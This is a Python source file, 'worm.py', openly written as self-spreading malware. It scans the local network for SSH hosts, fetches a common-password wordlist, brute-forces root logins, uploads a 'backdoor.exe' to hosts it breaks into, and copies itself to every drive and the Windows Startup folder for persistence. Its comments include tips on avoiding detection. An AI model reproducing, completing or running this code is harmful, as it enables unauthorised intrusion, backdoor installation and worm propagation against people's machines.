####################################
# File name: worm.py               #
# Author: Filip Komárek   (pylyf)  #
# Status: Development              #
# Date created: 7/6/2018           #
####################################
import nmap
import paramiko
import os
import socket
from urllib.request import urlopen
import urllib
import time
from ftplib import FTP
import ftplib
from shutil import copy2
import win32api
import netifaces
from threading import Thread

# ----- -----
import networking
# ----- -----

# ------------------- Logging ----------------------- #
import coloredlogs, logging
logger = logging.getLogger(__name__)
coloredlogs.install(fmt='%(message)s',level='DEBUG', logger=logger)
# --------------------------------------------------- #


# gets gateway of the network
gws = netifaces.gateways()
gateway = gws['default'][netifaces.AF_INET][0]

def scan_hosts(port):
    """
    Scans all machines on the same network that
     have SSH (port 22) enabled
    Returns:
        IP addresses of hosts
    """
    logger.debug(f"Scanning machines on the same network with port {port} open.")


    logger.debug("Gateway: " + gateway)

    port_scanner = nmap.PortScanner()
    port_scanner.scan(gateway + "/24", arguments='-p'+str(port)+' --open')

    all_hosts = port_scanner.all_hosts()

    logger.debug("Hosts: " + str(all_hosts))
    return all_hosts


def download_ssh_passwords(filename):
    """
     Downloads most commonly used ssh passwords from a specific url
      Clearly, you can store passwords in a dictionary, but i found this more comfortable

    Args:
        filename - Name to save the file as.
    """

    # TODO:130 This wordlist contains only few passwords. You would need a bigger one for real bruteforcing. \_(OwO)_/

    logger.debug("Downloading passwords...")
    url = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt"
    urllib.request.urlretrieve(url, filename)
    logger.debug("Passwords downloaded!")


def connect_to_ftp(host, username, password):
    # TODO:30 : Finish this function + Add bruteforcing
    try:
        ftp = FTP(host)
        ftp.login(username, password)
    except ftplib.all_errors as error:
        logger.error(error)
        pass


def connect_to_ssh(host, password):
    """
    Tries to connect to a SSH server

    Returns:
        True - Connection successful
        False - Something went wrong

    Args:
        host - Target machine's IP
        password - Password to use
    """

    # TODO:120 Pass usernames to the function too

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        logger.debug("Connecting to: " + host)
        client.connect(host, 22, "root", password)
        logger.debug("Successfully connected!")

        sftp = client.open_sftp()
        sftp.put('backdoor.exe', "destination") # change this.

        return True
    except socket.error:
        logger.error("Computer is offline or port 22 is closed")
        return False
    except paramiko.ssh_exception.AuthenticationException:
        logger.error("Wrong Password or Username")
        return False
    except paramiko.ssh_exception.SSHException:
        # socket is open, but not SSH service responded
        logger.error("No response from SSH server")
        return False


def bruteforce_ssh(host, wordlist):
    """
    Calls connect_to_ssh function and
    tries to bruteforce the target server.

    Args:
        wordlist - TXT file with passwords

    """
    # TODO:10 : Bruteforce usernames too
    file = open(wordlist, "r")
    for line in file:
        connection = connect_to_ssh(host, line)
        print(connection)
        time.sleep(5)

def drivespreading():
    # This function makes the worm copy itself on other drives on the computer
    # (also on the "startup" folder to be executed every time the computer boots)
    
    # WARNING: This function is very obvious to the user. The worm will be suddenly on every drive.
    # You may want to change the code and e.g. copy the worm only on new drives 
    bootfolder = os.path.expanduser('~') + "/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/"

    while True:
        drives = win32api.GetLogicalDriveStrings()
        drives = drives.split('\000')[:-1]
        print(drives)
        for drive in drives:
            try:
                if "C:\\" == drive:
                    copy2(__file__, bootfolder)
                else:
                    copy2(__file__, drive)
            except:
                pass
        
        time.sleep(3)

def start_drive_spreading():
    # Starts "drivespreading" function as a threaded function. 
    # This means that the code will spread on drives and execute other functions at the same time.
    thread = Thread(target = drivespreading)
    thread.start()
    
def main():
    start_drive_spreading()


if __name__ == "__main__":
    main()
